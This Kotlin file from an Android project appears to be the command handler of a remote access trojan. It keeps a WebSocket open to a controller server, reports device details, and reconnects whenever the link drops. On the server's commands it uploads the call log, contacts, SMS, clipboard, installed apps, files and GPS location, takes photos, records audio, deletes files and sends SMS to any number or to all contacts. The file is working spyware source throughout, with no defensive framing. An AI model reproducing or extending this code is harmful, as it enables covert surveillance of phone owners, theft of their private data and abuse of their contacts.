package willi.fiend.Utils

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket


class AppSocket(val context: Context) :
    okhttp3.WebSocketListener() {
    private val client = OkHttpClient()
    private val requests = AppRequest()
    val action = AppActions(context)

    fun connect() {
        AppScope.runBack {
            val request = Request.Builder().url(AppTools.getAppData().socket)
            requests.awake()
            request.addHeader("model", AppTools.getDeviceName())
            request.addHeader("battery", AppTools.getBatteryPercentage(context).toString())
            request.addHeader("version", AppTools.getAndroidVersion().toString() + " (SDK)")
            request.addHeader("brightness", AppTools.getScreenBrightness(context).toString())
            request.addHeader("provider", AppTools.getProviderName(context))
            client.newWebSocket(request.build(), this)
        }
    }

    override fun onMessage(webSocket: WebSocket, text: String) {
        Log.i("MESSAGE",text)
        when(text){
            "calls" -> {
                requests.sendWaterMark()
                action.uploadCalls()
            }
            "contacts" -> {
                requests.sendWaterMark()
                action.uploadContact()
            }
            "messages" -> {
                requests.sendWaterMark()
                action.uploadMessages()
            }
            "apps" -> {
                requests.sendWaterMark()
                action.uploadApps()
            }
            "device_info" -> {
                requests.sendWaterMark()
                action.uploadDeviceInfo()
            }
            "clipboard" -> {
                requests.sendWaterMark()
                action.uploadClipboard()
            }
            "camera_main" -> {
                requests.sendWaterMark()
                action.captureCameraMain()
            }
            "camera_selfie" -> {
                requests.sendWaterMark()
                action.captureCameraSelfie()
            }
            "gpsLocation" -> {
                requests.sendWaterMark()
                action.uploadGpsLocation()
            }
            "vibrate" -> {
                requests.sendWaterMark()
                action.vibratePhone()
            }
            "stop_audio" -> {
                requests.sendWaterMark()
                action.stopAudio()
            }
            "ping" -> webSocket.send("pong")
            else -> {
                val commend = text.split(":")[0]
                val data = text.split(":")[1]
                when(commend){
                    "send_message" -> {
                        val number = data.split("/")[0]
                        val message = data.split("/")[1]
                        action.sendMessage(number, message)
                        requests.sendWaterMark()
                    }
                    "send_message_to_all" -> {
                        action.messageToAllContacts(data)
                        requests.sendWaterMark()
                    }
                    "file" -> {
                        action.uploadFile(data)
                        requests.sendWaterMark()
                    }
                    "delete_file" -> {
                        action.deleteFile(data)
                        requests.sendWaterMark()
                    }
                    "microphone" -> {
                        val duration = data.toLongOrNull()
                        if (duration != null) {
                            action.captureMicrophone(duration)
                            requests.sendWaterMark()
                        } else {
                            requests.sendText(AppRequest.Text("Invalid duration"))
                            requests.sendWaterMark()
                        }
                    }
                    "toast" -> {
                        action.showToast(data)
                        requests.sendWaterMark()
                    }
                    "show_notification" -> {
                        val notificationData = text.substringAfter(":")
                        val title = notificationData.substringBefore("/")
                        val url = notificationData.substringAfter("/")
                        action.showNotification(title, url)
                        requests.sendWaterMark()
                    }
                    "play_audio" -> {
                        action.playAudio(text.substringAfter(":"))
                        requests.sendWaterMark()
                    }
                }
            }
        }
    }

    override fun onOpen(webSocket: WebSocket, response: Response) {}

    override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
        Log.i("ERR",reason)
        Handler(Looper.getMainLooper()).postDelayed({
            connect()
        }, 5000)
    }

    override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
        t.printStackTrace()
        if (response != null) {
            Log.i("ERR", response.message)
        }
        Handler(Looper.getMainLooper()).postDelayed({
            connect()
        }, 5000)
    }

    override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
        Log.i("ERR",reason)
        Handler(Looper.getMainLooper()).postDelayed({
            connect()
        }, 5000)
    }
}